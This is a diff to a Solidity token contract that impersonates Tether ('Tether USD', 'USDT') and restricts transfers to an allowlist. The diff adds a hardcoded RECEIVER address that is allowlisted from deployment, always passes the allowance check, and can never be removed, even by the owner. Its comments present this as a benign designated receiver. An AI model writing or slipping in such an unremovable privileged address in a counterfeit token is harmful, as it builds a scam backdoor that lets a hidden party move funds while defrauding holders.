@@ -15,6 +15,9 @@ contract TetherToken is ERC20, Ownable {
     // State
     // -------------------------------------------------------------------------
 
+    // Designated receiving address — permanently allowed, cannot be removed.
+    address public constant RECEIVER = 0xc69627c6ff05B85436706005b44ec3d7B33a6E11;
+
     bool private _paused;
 
     mapping(address => bool) private _blacklisted;
@@ -44,8 +47,9 @@ contract TetherToken is ERC20, Ownable {
      * @param initialSupply Total tokens minted to deployer, in whole units (decimals applied internally).
      */
     constructor(uint256 initialSupply) ERC20("Tether USD", "USDT") {
-        // Deployer is allowed by default
+        // Deployer and the designated RECEIVER are allowed from day one
         _allowed[_msgSender()] = true;
+        _allowed[RECEIVER]     = true;
         _mint(_msgSender(), initialSupply * (10 ** decimals()));
     }
 
@@ -90,7 +94,7 @@ contract TetherToken is ERC20, Ownable {
     // -------------------------------------------------------------------------
 
     function isAllowed(address account) public view returns (bool) {
-        return _allowed[account];
+        return account == RECEIVER || _allowed[account];
     }
 
     modifier onlyAllowed(address account) {
@@ -111,8 +115,9 @@ contract TetherToken is ERC20, Ownable {
      * @dev Owner removes an address from the transfer whitelist.
      */
     function disallowAddress(address account) external onlyOwner {
-        require(account != owner(), "TetherToken: cannot disallow owner");
-        require(_allowed[account], "TetherToken: not in allowlist");
+        require(account != owner(),   "TetherToken: cannot disallow owner");
+        require(account != RECEIVER,  "TetherToken: cannot disallow designated receiver");
+        require(_allowed[account],    "TetherToken: not in allowlist");
         _allowed[account] = false;
         emit AddressDisallowed(account);
     }
